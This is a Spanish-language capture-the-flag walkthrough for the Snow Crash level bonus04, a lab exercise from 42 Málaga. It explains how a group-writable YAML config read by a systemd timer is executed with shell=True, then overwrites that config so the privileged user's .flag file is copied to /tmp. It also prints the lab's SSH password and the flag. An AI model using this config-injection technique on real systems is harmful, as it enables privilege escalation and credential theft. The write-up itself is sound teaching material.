# Bonus04 — Snow Crash

> **Nivel bonus** · YAML + timer · `shell=True` · Config escribible por grupo

| | |
|---|---|
| **Proyecto** | Snow Crash (42) |
| **Nivel** | `bonus04` |
| **Usuario de entrada** | `bonus04` |
| **Objetivo** | Credencial de `flagbonus04` |
| **Idea central** | Reescribir `services.executor.command` en el YAML |

---

<a id="indice"></a>

## 📋 Índice

1. 🧭 [¿De qué va este nivel? (visión general)](#sec-1)
2. 🗺️ [Mapa mental del ataque](#sec-2)
3. 📖 [Glosario rápido](#sec-3)
4. 🏷️ [Tipo de ejercicio](#sec-4)
5. 🎯 [Objetivo](#sec-5)
6. 🔑 [Acceso al nivel](#sec-6)
7. 🔍 [Localizar el componente del nivel](#sec-7)
8. ⏱️ [Servicio y timer systemd](#sec-8)
9. 📄 [Lógica relevante de juanita.py](#sec-9)
10. 🔐 [Permisos de la configuración](#sec-10)
11. ✅ [Explotación](#sec-11)
12. 🏁 [Credencial final](#sec-12)
13. ⌨️ [Resumen de comandos válidos](#sec-13)
14. 💡 [Conceptos importantes](#sec-14)
15. 📦 [Conclusión](#sec-15)
16. 📁 [Estructura recomendada en el repositorio](#sec-16)
17. 📚 [Para seguir aprendiendo](#sec-17)
18. 🩹 [Errores frecuentes y qué significan](#sec-err)

> **Tip de navegación:** al final de cada sección encontrarás un enlace **↑ Volver al índice**.

---

<a id="sec-1"></a>

## 1. 🧭 ¿De qué va este nivel? (visión general)

Cada minuto un temporizador despierta a **Juanita** (`juanita.py` como
`flagbonus04`). Juanita lee un **manual de instrucciones**
(`/etc/juanita/config.yaml`). Tú no puedes crear ficheros nuevos en esa
carpeta, pero **sí puedes reescribir el manual** (grupo `juanita_grp`).

En el manual hay una línea `command:` que se ejecuta con `shell=True`. Si pones
ahí un `cp` del `.flag` a `/tmp`, en el siguiente ciclo tienes la flag.

Analogía: no eres el chef, pero puedes cambiar la receta del libro que el chef
sigue cada hora.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-2"></a>

## 2. 🗺️ Mapa mental del ataque

```text
  juanita.timer  (OnUnitActiveSec=60s)
        │
        ▼
  juanita.service (oneshot, User=flagbonus04)
        │  python3 /opt/snowcrash/bonus04/juanita.py
        │
        │  yaml.safe_load(/etc/juanita/config.yaml)
        │  valida metadata, services, defaults
        │  subprocess.run(command, shell=True)
        ▼
  command = cp .../.flag /tmp/juanita_flag
        │
        ▼
  [bonus04] cat /tmp/juanita_flag
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-3"></a>

## 3. 📖 Glosario rápido

| Término | Analogía cotidiana | Qué es en la práctica |
|---------|-------------------|------------------------|
| **systemd timer** | Despertador periódico | Dispara un servicio cada N segundos |
| **oneshot** | Tarea que arranca, termina y listo | Tipo de servicio sin daemon permanente |
| **`yaml.safe_load`** | Leer receta sin trucos de objetos mágicos | Sin RCE por deserialización; el peligro es `command` |
| **`shell=True`** | Pasar la frase al intérprete de comandos | Equivale a `/bin/sh -c "..."` |
| **Grupo escribible en un fichero** | Puedes editar el libro, no la estantería | `-rw-rw-r--` root:`juanita_grp` |

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-4"></a>

## 4. 🏷️ Tipo de ejercicio

Inyección de comando mediante un fichero de configuración **YAML escribible por
grupo**, consumido periódicamente por un servicio `systemd` (`oneshot` + timer)
que ejecuta el campo `command` con `subprocess.run(..., shell=True)` como
usuario privilegiado.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-5"></a>

## 5. 🎯 Objetivo

Obtener la credencial de `flagbonus04`.

```text
Juanita understood things others didn't bother to read.
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-6"></a>

## 6. 🔑 Acceso al nivel

```bash
ssh bonus04@localhost -p 2424
# password: mof3b3iud5c3p35bsv9aua0bj
whoami; id; cat README
```

Debes ver **`juanita_grp`**.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-7"></a>

## 7. 🔍 Localizar el componente del nivel

```bash
ls -laR /opt/snowcrash/bonus04
```

```text
-rwxr-xr-x  1 root root 7606 ... juanita.py
```

El script es **legible** por todos:

```bash
cat /opt/snowcrash/bonus04/juanita.py
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-8"></a>

## 8. ⏱️ Servicio y timer systemd

```bash
systemctl cat juanita.service
systemctl cat juanita.timer
systemctl list-timers --all | grep -i juanita
```

**Service:** `Type=oneshot`, `User=flagbonus04`,
`ExecStart=/usr/bin/python3 /opt/snowcrash/bonus04/juanita.py`.

**Timer:** `OnBootSec=10s`, `OnUnitActiveSec=60s` → cada ~**60 segundos**.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-9"></a>

## 9. 📄 Lógica relevante de juanita.py

Constantes:

```python
CONFIG_PATH = "/etc/juanita/config.yaml"
```

Carga:

```python
cfg = yaml.safe_load(fh)   # no es unsafe_load
```

Validación: exige `metadata`, `services`, `defaults` y
`services.executor.command` no vacío.

Ejecución:

```python
command = executor_cfg["command"]
subprocess.run(command, shell=True, timeout=timeout, capture_output=True, text=True)
```

`safe_load` evita objetos arbitrarios de PyYAML, pero **no** mitiga un campo
`command` que luego se pasa a `shell=True`.

**Analogía ampliada:** `yaml.safe_load` es como un lector de menús que **no**
acepta “trucos de magia” en el papel (no ejecuta código oculto en el YAML).
Pero si en el menú hay una casilla que dice “comando del día” y el cocinero
copia esa casilla tal cual a la cocina (`shell=True`), da igual lo “seguro”
que sea el lector del menú: lo peligroso es **quién rellena la casilla** y
**quién la ejecuta**.

En este nivel tú rellenas la casilla y Juanita (como `flagbonus04`) la ejecuta.


<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-10"></a>

## 10. 🔐 Permisos de la configuración

```bash
ls -la /etc/juanita/
ls -la /etc/juanita/config.yaml
```

```text
drwxr-xr-x  2 root juanita_grp ... .
-rw-rw-r--  1 root juanita_grp ... config.yaml
```

| Ruta | Efecto para `bonus04` |
|------|------------------------|
| Directorio | Listar/entrar; **no** crear ficheros nuevos |
| `config.yaml` | **Leer y modificar** |

El YAML original es largo; solo importan las claves del validador y
`services.executor.command` (por defecto `"/bin/true"`).

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-11"></a>

## 11. ✅ Explotación

```bash
cp /etc/juanita/config.yaml /tmp/config.yaml.bak

cat > /etc/juanita/config.yaml << 'EOF'
metadata:
  service_name: juanita
  version: "3.1.0"
defaults:
  retry_policy:
    retry_count: 1
    backoff_secs: 0
services:
  executor:
    command: "cp /home/flagbonus04/.flag /tmp/juanita_flag && chmod 644 /tmp/juanita_flag"
    timeout_secs: 30
    label: getflag
EOF

# Esperar al timer (hasta ~60-70 s)
for i in $(seq 1 15); do
  if [ -f /tmp/juanita_flag ]; then cat /tmp/juanita_flag; break; fi
  sleep 5
done
```

```text
oo0eoaiia5ei8oo9xasah2ihu
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-12"></a>

## 12. 🏁 Credencial final

```text
oo0eoaiia5ei8oo9xasah2ihu
```

→ `bonus04/flag` y contraseña de `bonus05`.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-13"></a>

## 13. ⌨️ Resumen de comandos válidos

```bash
cat /opt/snowcrash/bonus04/juanita.py
systemctl cat juanita.timer
ls -la /etc/juanita/config.yaml
# sobrescribir command + esperar timer
cat /tmp/juanita_flag
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-14"></a>

## 14. 💡 Conceptos importantes

- Timers de systemd + oneshot
- `yaml.safe_load` no implica lista blanca de comandos
- `subprocess.run(..., shell=True)` como vector de inyección
- Fichero de config escribible por grupo aunque el directorio no lo sea

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-15"></a>

## 15. 📦 Conclusión

Cambiar la receta que Juanita ejecuta cada minuto. Credencial:

```text
oo0eoaiia5ei8oo9xasah2ihu
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-16"></a>

## 16. 📁 Estructura recomendada en el repositorio

```text
bonus04/
├── flag
└── resources/
    └── bonus04.md
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-17"></a>

## 17. 📚 Para seguir aprendiendo

| Tema | Pista |
|------|--------|
| Timers | `man systemd.timer` |
| subprocess | riesgos de `shell=True` |
| Hardening | configs de solo lectura, allowlists |

<p align="right"><a href="#indice">↑ Volver al índice</a></p>


---

<a id="sec-err"></a>

## 18. 🩹 Errores frecuentes y qué significan

Cuando algo “no funciona”, casi siempre el mensaje del sistema apunta a una
causa concreta. Esta tabla resume los síntomas más habituales de **bonus04**,
qué suelen querer decir y el siguiente comando o acción razonable.

| Síntoma | Causa probable | Qué hacer |
|---------|----------------|-----------|
| `touch /etc/juanita/x`: Permission denied | El **directorio** no es escribible | Normal. Sobrescribe **`config.yaml`**, no crees ficheros nuevos. |
| No aparece `/tmp/juanita_flag` | El timer aún no ha disparado | Espera ~60 s; comprueba `systemctl list-timers \| grep juanita`. |
| YAML escrito pero no ejecuta el comando | Falta clave del validador | Debe haber `metadata`, `services`, `defaults` y `services.executor.command`. |
| `systemctl start juanita.service` falla | Sin privilegios de administración | No hace falta: el **timer** ya lo lanza solo. |
| El comando corre pero no hay flag | Ruta del `.flag` o permisos de `/tmp` | Usa `cp ... && chmod 644 /tmp/juanita_flag`. |
| ¿Es un RCE por YAML inseguro? | No: usa `safe_load` | El vector es **`shell=True`** sobre el campo `command`. |

**Cómo usarla:** localiza la fila que más se parezca a lo que ves en pantalla,
aplica la acción sugerida y, si el síntoma cambia, vuelve a consultar la tabla
(a menudo un error se resuelve y aparece el siguiente de la lista).

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<div align="center">

**42 Málaga** — **rdel-olm & sternero** — **Octubre 2026**

*Snow Crash · bonus04 · material didáctico de resolución*

</div>
